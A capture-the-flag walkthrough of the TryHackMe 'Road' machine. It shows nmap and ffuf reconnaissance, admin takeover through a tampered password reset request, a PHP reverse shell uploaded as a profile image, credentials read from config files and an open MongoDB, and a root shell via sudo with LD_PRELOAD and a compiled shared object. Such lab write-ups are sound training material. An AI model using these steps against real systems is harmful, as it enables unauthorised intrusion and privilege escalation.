# [Road](https://tryhackme.com/room/road)

## Initial Foothold

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Thu Feb 17 13:12:18 2022 as: nmap -vvv -p 22,80 -sCV -oA init 10.10.96.183
Nmap scan report for 10.10.96.183
Host is up, received syn-ack (0.24s latency).
Scanned at 2022-02-17 13:12:32 +07 for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e6:dc:88:69:de:a1:73:8e:84:5b:a1:3e:27:9f:07:24 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDXhjztNjrxAn+QfSDb6ugzjCwso/WiGgq/BGXMrbqex9u5Nu1CKWtv7xiQpO84MsC2li6UkIAhWSMO0F//9odK1aRpPbH97e1ogBENN6YBP0s2z27aMwKh5UMyrzo5R42an3r6K+1x8lfrmW8VOOrvR4pZg9Mo+XNR/YU88P3XWq22DNPJqwtB3q4Sw6M/nxxUjd01kcbjwd1d9G+nuDNraYkA2T/OTHfp/xbhet9K6ccFHoi+A8r6aL0GV/qqW2pm4NdfgwKxM73VQzyolkG/+DFkZc+RCH73dYLEfVjMjTbZTA+19Zd2hlPJVtay+vOZr1qJ9ZUDawU7rEJgJ4hHDqlVjxX9Yv9SfFsw+Y0iwBfb9IMmevI3osNG6+2bChAtI2nUJv0g87I31fCbU5+NF8VkaGLz/sZrj5xFvyrjOpRnJW3djQKhk/Avfs2wkZ+GiyxBOZLetSDFvTAARmqaRqW9sjHl7w4w1+pkJ+dkeRsvSQlqw+AFX0MqFxzDF7M=
|   256 6b:ea:18:5d:8d:c7:9e:9a:01:2c:dd:50:c5:f8:c8:05 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNBLTibnpRB37eKji7C50xC9ujq7UyiFQSHondvOZOF7fZHPDn3L+wgNXEQ0wei6gzQfiZJmjQ5vQ88vEmCZzBI=
|   256 ef:06:d7:e4:b1:65:15:6e:94:62:cc:dd:f0:8a:1a:24 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPv3g1IqvC7ol2xMww1gHLeYkyUIe8iKtEBXznpO25Ja
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: FB0AA7D49532DA9D0006BA5595806138
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Sky Couriers
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 17 13:12:46 2022 -- 1 IP address (1 host up) scanned in 28.40 seconds
```

We have an HTTP server on port 80.
On the landing page is the email address `info@skycouriers.thm` so we add `skycouriers.thm` to our `/etc/hosts`.
Visiting using the domain name doesn't seem any different from using the IP address though.
Since we have a domain name, might as well fuzz for subdomains.

```sh
$ ffuf -u 'http://skycouriers.thm/' -H "Host: FUZZ.skycouriers.thm" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 19607
```

However, that doesn't give us anything new.

Looking and clicking around the landing page, only the login page and the "Track Order" form seem interesting.
Filling and searching the "Track Order" form gets us to the non-existent page `/v2/admin/track_orders?awb=1&srchorder=`, though `/vs/admin/` does exists but with directory listing disabled. From the login page `/v2/admin/login.html`, we can register a new user and log in.

Looking at `/v2/profile.php`, at the bottom of the page is a message with the email address `admin@sky.thm` so we can add `sky.thm` to out `/etc/hosts`.
However, it seems to be the same as `skycouriers.thm` before and after logging in.
Also on `/v2/profile.php`, I tried uploading a PHP reverse shell for the profile image but it doesn't seem to work because I'm not an admin.
We know the admin's username so we can try changing their password at `/v2/ResetUser.php`.
Since the user can't change the username in the browser as it is, I figured I'd change the username in Burp.

![Password reset for `admin@sky.thm `](pw_reset.png)

Success! We can now log in as admin.
As admin, I uploaded a PHP reverse shell as the profile image which works, and looking at the HTML source code of `/v2/profile.php`, we can see the comment `/v2/profileimages/` telling us where to trigger the shell.
After setting up the listener, I simply went to `/v2/profileimages/rev.php` and got a shell as `www-data`.

## Privilege Escalation to webdeveloper

Looking at listening TCP ports ...

```sh
www-data@sky:/$ ss -tlnp
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process
LISTEN  0        70             127.0.0.1:33060          0.0.0.0:*
LISTEN  0        511            127.0.0.1:9000           0.0.0.0:*
LISTEN  0        4096           127.0.0.1:27017          0.0.0.0:*
LISTEN  0        151            127.0.0.1:3306           0.0.0.0:*
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*
LISTEN  0        511                    *:80                   *:*
LISTEN  0        128                 [::]:22                [::]:*
```

... we have MySQL on ports 3306 and 33060 and MongoDB on port 27017.

Looking around `/var/www/html/v2`, the file `lostpassword.php` contains MySQL credentials for the user root. However, the database `SKY` doesn't give us anything new.

We can connect to MongoDB without credentials simply by running `mongo`. Enumerating it, we can find webdeveloper's credentials.

```
> show dbs
admin   0.000GB
backup  0.000GB
config  0.000GB
local   0.000GB
> use backup
switched to db backup
> show collections
collection
user
> db.user.find()
{ "_id" : ObjectId("60ae2661203d21857b184a76"), "Month" : "Feb", "Profit" : "25000" }
{ "_id" : ObjectId("60ae2677203d21857b184a77"), "Month" : "March", "Profit" : "5000" }
{ "_id" : ObjectId("60ae2690203d21857b184a78"), "Name" : "webdeveloper", "Pass" : "<REDACTED>" }
{ "_id" : ObjectId("60ae26bf203d21857b184a79"), "Name" : "Rohit", "EndDate" : "December" }
{ "_id" : ObjectId("60ae26d2203d21857b184a7a"), "Name" : "Rohit", "Salary" : "30000" }
```

With that, we should be able to `su - webdeveloper`. After the privesc, I also uploaded my SSH key and got a nice SSH shell as webdeveloper.

## Privilege Escalation to root

Checking webdeveloper's `sudo` privileges ...

```sh
webdeveloper@sky:~$ sudo -l
Matching Defaults entries for webdeveloper on sky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User webdeveloper may run the following commands on sky:
    (ALL : ALL) NOPASSWD: /usr/bin/sky_backup_utility
```

We see 2 things: `LD_PRELOAD` can potentially be abused, and `/usr/bin/sky_backup_utility` can be run as root without a password.

Following [hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld_preload), we can abuse `LD_PRELOAD` by compiling the malicious `pe.so` and executing `/usr/bin/sky_backup_utility` with `sudo` and `pe.so`.

```sh
webdeveloper@sky:/tmp$ vim pe.c
webdeveloper@sky:/tmp$ gcc -fPIC -shared -o pe.so pe.c -nostartfiles
webdeveloper@sky:/tmp$ sudo LD_PRELOAD=/tmp/pe.so /usr/bin/sky_backup_utility
```

With that, we should have a shell as root.
